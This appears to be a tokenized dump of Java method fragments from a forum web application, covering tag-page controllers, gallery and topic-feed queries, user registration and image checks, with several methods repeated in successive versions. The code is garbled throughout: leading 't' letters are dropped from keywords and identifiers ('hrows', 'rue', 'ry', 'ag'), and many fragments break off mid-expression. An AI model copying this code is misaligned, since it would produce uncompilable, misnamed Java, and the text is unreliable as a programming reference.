public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag ) ) ; return mv ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , 21 ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; return ImmutableMap . < String , Object > of ( " fullNews " , fullNews , 
private Map < String , Object > getGallerySection ( String ag ) hrows TagNotFoundException { List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( 3 , ag ) ) ; return ImmutableMap . < String , Object > of ( " gallery " , list 
public int getTagId ( String ag ) hrows TagNotFoundException { return agDao . getTagId ( ag , rue ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count ) hrows TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( opicListDto ) ; } 
public List < GalleryItem > getGalleryItems ( int countItems , String ag ) hrows TagNotFoundException { final Section gallery = sectionService . getSection ( Section . SECTION_GALLERY ) ; int agId = agService . getTagId ( ag ) ; String sql = " SELECT t.msgid, t.stat1,t.title, t.userid, t.urlname, images.icon, images.original, images.id AS imageid, t.commitdate " + " FROM (SELECT topics.id AS msgid, topics.stat1, topics.title, userid, urlname, topics.commitdate " + " FROM topics JOIN groups ON topics.groupid = groups.id WHERE topics.moderate AND section= " + Section . SECTION_GALLERY + " " + " AND NOT topics.deleted AND commitdate IS NOT NULL AND topics.id IN (SELECT msgid FROM tags WHERE tagid=?) ORDER BY commitdate DESC LIMIT ?) " + " as t JOIN images ON t.msgid = images.topic " ; return jdbcTemplate . query ( sql , new GalleryItemRowMapper ( gallery ) , agId , countItems ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public List < GalleryItem > getGalleryItems ( int countItems , int agId ) hrows TagNotFoundException { final Section gallery = sectionService . getSection ( Section . SECTION_GALLERY ) ; String sql = " SELECT t.msgid, t.stat1,t.title, t.userid, t.urlname, images.icon, images.original, images.id AS imageid, t.commitdate " + " FROM (SELECT topics.id AS msgid, topics.stat1, topics.title, userid, urlname, topics.commitdate " + " FROM topics JOIN groups ON topics.groupid = groups.id WHERE topics.moderate AND section= " + Section . SECTION_GALLERY + " " + " AND NOT topics.deleted AND commitdate IS NOT NULL AND topics.id IN (SELECT msgid FROM tags WHERE tagid=?) ORDER BY commitdate DESC LIMIT ?) " + " as t JOIN images ON t.msgid = images.topic " ; return jdbcTemplate . query ( sql , new GalleryItemRowMapper ( gallery ) , agId , countItems ) ; } 
private Map < String , Object > getGallerySection ( String ag ) hrows TagNotFoundException { int agId = agService . getTagId ( ag ) ; List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( 3 , agId ) ) ; return ImmutableMap . < String , Object > of ( " gallery " , list 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag ) ) ; mv . addAllObjects ( getForumSection ( ag ) ) ; return mv ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; return ImmutableMap . < String , Object > of ( " fullNews " , fullNews , 
private Map < String , List < Topic > > getForumSection ( String ag ) hrows TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = opicListService . getTopicsFeed ( forumSection , null , ag , 0 , null , null , FORUM_TOPIC_COUNT ) ; return ImmutableMap . of ( " forum1 " , firstHalf ( forumTopics ) , 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , Integer offset , Integer year , Integer month , int count ) hrows TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . oString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . oString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( ag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . oString ( ) ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag ) ) ; } if ( month ! = null & & year ! = null ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) ; opicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( ag = = null & & group = = null & & ! section . isPremoderated ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return opicListDao . getTopics ( opicListDto ) ; } 
public ForumItem apply ( Topic input ) { return new ForumItem ( input , groupDao . getGroup ( input . getGroupId ( ) ) ) ; } 
private Map < String , List < ForumItem > > getForumSection ( String ag ) hrows TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = opicListService . getTopicsFeed ( forumSection , null , ag , 0 , null , null , FORUM_TOPIC_COUNT ) ; return ImmutableMap . of ( " forum1 " , Lists . ransform ( firstHalf ( forumTopics ) , forumPrepareFunction ) , 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( agId ) ) ; mv . addAllObjects ( getForumSection ( ag ) ) ; return mv ; } 
private Map < String , Object > getGallerySection ( int agId ) hrows TagNotFoundException { List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( 3 , agId ) ) ; return ImmutableMap . < String , Object > of ( " gallery " , list 
public DateTime apply ( Topic input ) { return new DateTime ( input . getLastModified ( ) ) ; } 
private Map < String , Map < String , Collection < ForumItem > > > getForumSection ( String ag ) hrows TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = opicListService . getTopicsFeed ( forumSection , null , ag , 0 , null , null , FORUM_TOPIC_COUNT ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; return ImmutableMap . of ( " forum " , Multimaps . ransformValues ( sections , forumPrepareFunction ) . asMap ( ) 
private static ImmutableListMultimap < String , Topic > datePartition ( Iterable < Topic > opics , final Function < Topic , DateTime > dateExtractor ) { final DateMidnight startOfToday = new DateMidnight ( ) ; final DateMidnight startOfYesterday = startOfToday . minusDays ( 1 ) ; final DateMidnight startOfYear = startOfToday . withDayOfYear ( 1 ) ; return Multimaps . index ( opics , new Function < Topic , String > ( ) { @Override 
public DateTime apply ( Topic input ) { return new DateTime ( input . getCommitDate ( ) ) ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = datePartition ( briefNewsTopics , COMMITDATE_EXTRACTOR ) ; return ImmutableMap . < String , Object > of ( " fullNews " , fullNews , 
private ImmutableMap < String , ImmutableList < ImmutableMap < String , List < ForumItem > > > > getForumSection ( String ag ) hrows TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = opicListService . getTopicsFeed ( forumSection , null , ag , 0 , null , null , FORUM_TOPIC_COUNT ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; return ImmutableMap . of ( " forum " , split ( Multimaps . ransformValues ( sections , forumPrepareFunction ) ) 
private static < T > ImmutableList < ImmutableMap < String , List < T > > > split ( ListMultimap < String , T > opics ) { if ( opics . isEmpty ( ) ) { return ImmutableList . of ( ) ; } int split = opics . size ( ) / 2 + ( opics . size ( ) % 2 ) ; ImmutableMap . Builder < String , List < T > > first = ImmutableMap . builder ( ) ; ImmutableMap . Builder < String , List < T > > second = ImmutableMap . builder ( ) ; int otal = 0 ; for ( Map . Entry < String , Collection < T > > entry : opics . asMap ( ) . entrySet ( ) ) { int currentSize = entry . getValue ( ) . size ( ) ; if ( otal + ( currentSize / 2 ) < = split ) { first . put ( entry . getKey ( ) , ImmutableList . copyOf ( entry . getValue ( ) ) ) ; } else { second . put ( entry . getKey ( ) , ImmutableList . copyOf ( entry . getValue ( ) ) ) ; } otal + = currentSize ; } return ImmutableList . of ( first . build ( ) , second . build ( ) ) ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( agId ) ) ; mv . addAllObjects ( getForumSection ( ag ) ) ; return mv ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; mv . addObject ( " counter " , agService . getCounter ( ag ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( agId ) ) ; mv . addAllObjects ( getForumSection ( ag ) ) ; return mv ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = datePartition ( briefNewsTopics , COMMITDATE_EXTRACTOR ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , ag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . agListUrl ( ag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , split ( briefNews ) ) ; return out . build ( ) ; } 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; params . put ( " addportal " , sectionService . getAddInfo ( group . getSectionId ( ) ) ) ; params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } params . put ( " opTags " , agService . getTopTags ( ) ) ; return params . build ( ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " ag " , required = false ) String ag ) hrows UserErrorException { Map < String , Object > params = new HashMap < > ( ) ; if ( ag ! = null ) { TagService . checkTag ( ag ) ; params . put ( " ag " , ag ) ; } params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public static String agListUrl ( String ag , Section section ) { return TAG_URI_SECTION_TEMPLATE . expand ( ag , section . getId ( ) ) . oString ( ) ; } 
private static String buildTagUri ( String ag , int section , int offset ) { UriComponentsBuilder builder = UriComponentsBuilder . fromUri ( TAG_URI_TEMPLATE . expand ( ag ) ) ; if ( section ! = 0 ) { builder . queryParam ( " section " , section ) ; } if ( offset ! = 0 ) { builder . queryParam ( " offset " , offset ) ; } return builder . build ( ) . oUriString ( ) ; } 
public View agFeedOld ( @RequestParam String ag ) { return new RedirectView ( agListUrl ( ag ) ) ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Forbidden " ) ; } agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; mv . addObject ( " counter " , agService . getCounter ( ag ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag , agId , mpl ) ) ; mv . addAllObjects ( getForumSection ( ag ) ) ; return mv ; } 
private Map < String , Object > getGallerySection ( String ag , int agId , Template mpl ) hrows TagNotFoundException { List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( GALLERY_COUNT , agId ) ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; Section section = sectionService . getSection ( Section . SECTION_GALLERY ) ; if ( mpl . isSessionAuthorized ( ) ) { out . put ( " addGallery " , AddTopicController . getAddUrl ( section , ag ) ) ; } if ( list . size ( ) = = GALLERY_COUNT ) { out . put ( " moreGallery " , TagTopicListController . agListUrl ( ag , section ) ) ; } out . put ( " gallery " , list ) ; return out . build ( ) ; } 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; String addInfo = sectionService . getAddInfo ( group . getSectionId ( ) ) ; if ( addInfo ! = null ) { params . put ( " addportal " , addInfo ) ; } params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } params . put ( " opTags " , agService . getTopTags ( ) ) ; return params . build ( ) ; } 
private ImmutableMap < String , Object > getForumSection ( String ag ) hrows TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; List < Topic > forumTopics = opicListService . getTopicsFeed ( forumSection , null , ag , 0 , null , null , FORUM_TOPIC_COUNT ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; if ( forumTopics . size ( ) = = FORUM_TOPIC_COUNT ) { out . put ( " moreForum " , TagTopicListController . agListUrl ( ag , forumSection ) ) ; } out . put ( " addForum " , AddTopicController . getAddUrl ( forumSection , ag ) ) ; out . put ( " forum " , split ( Multimaps . ransformValues ( sections , forumPrepareFunction ) ) ) ; return out . build ( ) ; } 
private ImmutableMap < String , Object > getForumSection ( @Nonnull String ag , int agId ) hrows TagNotFoundException { Section forumSection = sectionService . getSection ( Section . SECTION_FORUM ) ; TopicListDto opicListDto = new TopicListDto ( ) ; opicListDto . setSection ( forumSection . getId ( ) ) ; opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; opicListDto . setTag ( agId ) ; opicListDto . setLimit ( FORUM_TOPIC_COUNT ) ; opicListDto . setLastmodSort ( rue ) ; List < Topic > forumTopics = opicListService . getTopics ( opicListDto ) ; ImmutableListMultimap < String , Topic > sections = datePartition ( forumTopics , LASTMOD_EXTRACTOR ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; if ( forumTopics . size ( ) = = FORUM_TOPIC_COUNT ) { out . put ( " moreForum " , TagTopicListController . agListUrl ( ag , forumSection ) ) ; } out . put ( " addForum " , AddTopicController . getAddUrl ( forumSection , ag ) ) ; out . put ( " forum " , split ( Multimaps . ransformValues ( sections , forumPrepareFunction ) ) ) ; return out . build ( ) ; } 
public boolean isLastmodSort ( ) { return lastmodSort ; } 
public ModelAndView agPage ( HttpServletRequest request , @PathVariable String ag ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; agService . checkTag ( ag ) ; ModelAndView mv = new ModelAndView ( " ag-page " ) ; mv . addObject ( " ag " , ag ) ; mv . addObject ( " itle " , WordUtils . capitalize ( ag ) ) ; mv . addObject ( " counter " , agService . getCounter ( ag ) ) ; if ( mpl . isSessionAuthorized ( ) ) { mv . addObject ( " showFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; mv . addObject ( " showUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; } int agId = agService . getTagId ( ag ) ; mv . addObject ( " favsCount " , userTagService . countFavs ( agId ) ) ; mv . addAllObjects ( getNewsSection ( request , ag ) ) ; mv . addAllObjects ( getGallerySection ( ag , agId , mpl ) ) ; mv . addAllObjects ( getForumSection ( ag , agId ) ) ; return mv ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String own , String ip ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , own ) ; userLogDao . logRegister ( userid , ip ) ; return userid ; } 
public void logRegister ( int userid , @Nonnull String ip ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
private static boolean isDeletableByUser ( Topic opic , User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( opic . getPostdate ( ) . compareTo ( hourDeltaTime ) > = 0 & & 
public static ImageParam imageCheck ( File file ) hrows BadImageException , IOException { long size = file . length ( ) ; ImageInputStream iis = ImageIO . createImageInputStream ( file ) ; if ( iis = = null ) { hrow new BadImageException ( " Invalid image " ) ; } Iterator < ImageReader > iter = ImageIO . getImageReaders ( iis ) ; if ( ! iter . hasNext ( ) ) { hrow new BadImageException ( " Invalid image " ) ; } ImageReader reader = iter . next ( ) ; reader . setInput ( iis ) ; String formatName = reader . getFormatName ( ) ; if ( ! Arrays . asList ( supportedFormat ) . contains ( formatName ) ) { hrow new BadImageException ( " Does unsupported format " + formatName ) ; } boolean animated = hasAnimatedPng ( reader ) | | reader . getNumImages ( rue ) > 1 ; int height = reader . getHeight ( 0 ) ; int width = reader . getWidth ( 0 ) ; iis . close ( ) ; return new ImageParam ( formatName , animated , height , width , size ) ; } 
public static boolean isStyle ( String style ) { return STYLES . contains ( style ) ; } 
public String apply ( Theme input ) { return input . getId ( ) ; } 
public static boolean isStyle ( String style ) { return THEMES . containsKey ( style ) ; } 
private void doResize ( File uploadedFile ) hrows IOException , BadImageException { if ( mainFile . exists ( ) ) { mainFile . delete ( ) ; } FileUtils . moveFile ( uploadedFile , mainFile ) ; boolean error = rue ; ry { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public static ImageParam imageInfo ( File file ) hrows BadImageException , IOException { long size = file . length ( ) ; ImageInputStream iis = ImageIO . createImageInputStream ( file ) ; if ( iis = = null ) { hrow new BadImageException ( " Invalid image " ) ; } Iterator < ImageReader > iter = ImageIO . getImageReaders ( iis ) ; if ( ! iter . hasNext ( ) ) { hrow new BadImageException ( " Invalid image " ) ; } ImageReader reader = iter . next ( ) ; reader . setInput ( iis ) ; String formatName = reader . getFormatName ( ) ; if ( ! Arrays . asList ( supportedFormat ) . contains ( formatName ) ) { hrow new BadImageException ( " Does unsupported format " + formatName ) ; } boolean animated = false ; int height = reader . getHeight ( 0 ) ; int width = reader . getWidth ( 0 ) ; iis . close ( ) ; return new ImageParam ( formatName , animated , height , width , size ) ; } 
private ImageInfo imageInfoTestPass1 ( ) hrows Exception { return new ImageInfo ( " src/test/resources/images/i_want_to_be_a_hero__apng_animated__by_tamalesyatole-d5ht8eu.png " ) ; } 
private ImageInfo imageInfoTestPass2 ( ) hrows Exception { return new ImageInfo ( " src/main/webapp/img/pcard.jpg " ) ; } 
public void imageInfoTest1 ( ) hrows Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageInfo info = imageInfoTestPass1 ( ) ; 
public void imageInfoTest2 ( ) hrows Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageInfo info = imageInfoTestPass2 ( ) ; 
private ImageParam imageCheckTestPass1 ( ) hrows Exception { return ImageUtil . imageInfo ( new File ( " src/test/resources/images/i_want_to_be_a_hero__apng_animated__by_tamalesyatole-d5ht8eu.png " ) ) ; } 
private ImageParam imageCheckTestPass2 ( ) hrows Exception { return ImageUtil . imageInfo ( new File ( " src/main/webapp/img/pcard.jpg " ) ) ; } 
private ImageParam imageCheckTestPass3 ( ) hrows Exception { return ImageUtil . imageInfo ( new File ( " src/main/webapp/img/nonexistent " ) ) ; } 
public void imageInfoTest1 ( ) hrows Exception { for ( int i = 0 ; i < 10000 ; i + + ) { ImageParam param = imageCheckTestPass1 ( ) ; 
